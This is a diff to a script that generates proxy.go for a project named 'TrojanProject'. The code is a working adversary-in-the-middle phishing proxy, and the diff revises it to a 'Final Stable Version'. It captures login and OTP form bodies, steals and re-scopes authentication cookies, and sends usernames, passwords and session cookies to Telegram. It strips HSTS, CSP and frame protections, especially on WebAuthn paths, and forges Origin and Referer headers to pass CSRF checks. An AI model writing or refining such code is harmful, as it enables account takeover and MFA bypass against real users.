@@ -104,6 +104,7 @@ EOF
 # B. proxy.go (Enhanced with FIDO2/WebAuthn, CSP, HSTS, CORS, etc.)
 # B. proxy.go (Enhanced with Session Tracking & Combined Exfiltration)
 # B. proxy.go (Enhanced with Session Tracking & Essential Cookies Only)
+# B. proxy.go (Final Stable Version)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 
@@ -125,7 +126,7 @@ import (
 type Session struct {
 	Username  string
 	Password  string
-	Sent      bool      // flag to avoid duplicate alerts
+	Sent      bool
 	Timestamp time.Time
 }
 
@@ -156,7 +157,6 @@ func getCredentials(key string) (username, password string, sent bool, found boo
 	mu.Lock()
 	defer mu.Unlock()
 	if sess, ok := sessions[key]; ok {
-		// Do not delete yet – we might need to send again if more cookies appear
 		return sess.Username, sess.Password, sess.Sent, true
 	}
 	return "", "", false, false
@@ -207,18 +207,12 @@ func extractCredentials(bodyStr string) (username, password string) {
 }
 
 func rewriteCSP(csp string, myHost string) string {
+	// Only rewrite if CSP exists; never add a fallback.
+	// Add our domain to the relevant directives.
 	ourOrigin := "https://" + myHost
-	// Remove strict directives that might break our proxy
-	csp = strings.ReplaceAll(csp, "'unsafe-inline'", "")
-	csp = strings.ReplaceAll(csp, "'unsafe-eval'", "")
-	// Ensure default-src includes our domain
-	if !strings.Contains(csp, "default-src") {
-		csp = "default-src 'self' " + ourOrigin + "; " + csp
-	}
-	// Add our domain to all relevant src directives
-	for _, dir := range []string{"script-src", "style-src", "img-src", "connect-src"} {
-		if strings.Contains(csp, dir) {
-			re := regexp.MustCompile(`(` + dir + `\s+[^;]+)`)
+	for _, dir := range []string{"default-src", "script-src", "style-src", "img-src", "connect-src"} {
+		re := regexp.MustCompile(`(` + dir + `\s+[^;]+)`)
+		if re.MatchString(csp) {
 			csp = re.ReplaceAllString(csp, "$1 "+ourOrigin)
 		}
 	}
@@ -236,6 +230,7 @@ func isWebAuthnPath(path string) bool {
 }
 
 func handleWebAuthn(resp *http.Response, myHost string, t *Target) {
+	// Minimal modifications for WebAuthn
 	resp.Header.Del("Strict-Transport-Security")
 	resp.Header.Del("Content-Security-Policy")
 	resp.Header.Del("X-Frame-Options")
@@ -255,23 +250,30 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
 
-	// Keep Origin/Referer but set them to the target domain to avoid CSRF failures
-	if orig := r.Header.Get("Origin"); orig != "" {
-		r.Header.Set("Origin", "https://"+t.BaseDomain)
-	} else {
-		r.Header.Del("Origin") // No Origin header, leave it removed
-	}
-	if ref := r.Header.Get("Referer"); ref != "" {
-		// Replace the host part with our target domain (the real backend)
-		u, err := url.Parse(ref)
+	// Rewrite Origin and Referer to point to the original target domain
+	if origin := r.Header.Get("Origin"); origin != "" {
+		// Replace the origin with the target domain (same scheme, host)
+		origURL, err := url.Parse(origin)
 		if err == nil {
-			u.Host = t.BaseDomain
-			u.Scheme = "https"
-			r.Header.Set("Referer", u.String())
+			origURL.Host = remote.Host
+			origURL.Scheme = remote.Scheme
+			r.Header.Set("Origin", origURL.String())
+		}
+	} else {
+		r.Header.Del("Origin")
+	}
+
+	if referer := r.Header.Get("Referer"); referer != "" {
+		refURL, err := url.Parse(referer)
+		if err == nil {
+			refURL.Host = remote.Host
+			refURL.Scheme = remote.Scheme
+			r.Header.Set("Referer", refURL.String())
 		}
 	} else {
 		r.Header.Del("Referer")
 	}
+
 	r.Header.Set("X-Forwarded-Host", myHost)
 
 	// Capture POST bodies (credentials)
@@ -285,7 +287,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			storeCredentials(sessionKey, username, password)
 		}
 
-		// Send immediate alert for any credential-like POST
+		// Immediate alert for any credential-like POST
 		if strings.Contains(bodyStr, "pass") || strings.Contains(bodyStr, "login") || strings.Contains(bodyStr, "otp") {
 			SendToTelegram(fmt.Sprintf("🔓 [DATA] %s\nTarget: %s\nBody: %s", t.Name, myHost, bodyStr))
 		}
@@ -293,7 +295,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 
 	// ---------- Response Modifications ----------
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		// Special handling for WebAuthn endpoints
+		// Special handling for WebAuthn
 		if isWebAuthnPath(r.URL.Path) {
 			handleWebAuthn(resp, myHost, t)
 			return nil
@@ -325,12 +327,9 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		resp.Header.Del("Feature-Policy")
 		resp.Header.Del("Referrer-Policy")
 
-		// 5. CSP rewriting
+		// 5. CSP rewriting (only if exists)
 		if csp := resp.Header.Get("Content-Security-Policy"); csp != "" {
 			resp.Header.Set("Content-Security-Policy", rewriteCSP(csp, myHost))
-		} else {
-			// Permissive fallback CSP
-			resp.Header.Set("Content-Security-Policy", "default-src 'self' https://"+myHost+" 'unsafe-inline' 'unsafe-eval'")
 		}
 
 		// 6. Cookie re‑scoping & exfiltration (only essential cookies)
@@ -339,10 +338,11 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		var authCookies []*http.Cookie
 
 		for _, c := range oldCookies {
-			c.Domain = myHost // Point cookie to our lure domain
+			// Re-scope cookie to our domain
+			c.Domain = myHost
 			http.SetCookie(w, c)
 
-			// Check if this cookie matches any of the target's authentication cookies
+			// Collect only essential cookies (match AuthCookies)
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
 					authCookies = append(authCookies, c)
@@ -351,11 +351,10 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		// If we found any authentication cookies and haven't sent for this session yet
+		// Send combined message if we have essential cookies and haven't sent before
 		if len(authCookies) > 0 {
 			username, password, sent, found := getCredentials(sessionKey)
 			if found && !sent {
-				// Build message with only essential cookies (authCookies)
 				msg := fmt.Sprintf("🎯 [%s] SUCCESS!\n", t.Name)
 				msg += fmt.Sprintf("🌐 Target: %s\n", myHost)
 				msg += fmt.Sprintf("👤 Username: %s\n", username)
@@ -367,7 +366,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 				SendToTelegram(msg)
 				markSent(sessionKey)
 
-				// Redirect to a safe page after successful capture
+				// Redirect to safe page after capture
 				resp.Header.Set("Location", "https://www.google.com/docs/about/")
 				resp.StatusCode = http.StatusFound
 			}
@@ -375,7 +374,8 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 
 		// 7. Body rewriting (recursive domain replacement)
 		contentType := resp.Header.Get("Content-Type")
-		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
+		if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "text/plain") ||
+			strings.Contains(contentType, "application/javascript") || strings.Contains(contentType, "application/json") {
 			oldBody, _ := io.ReadAll(resp.Body)
 			bodyStr := string(oldBody)
 
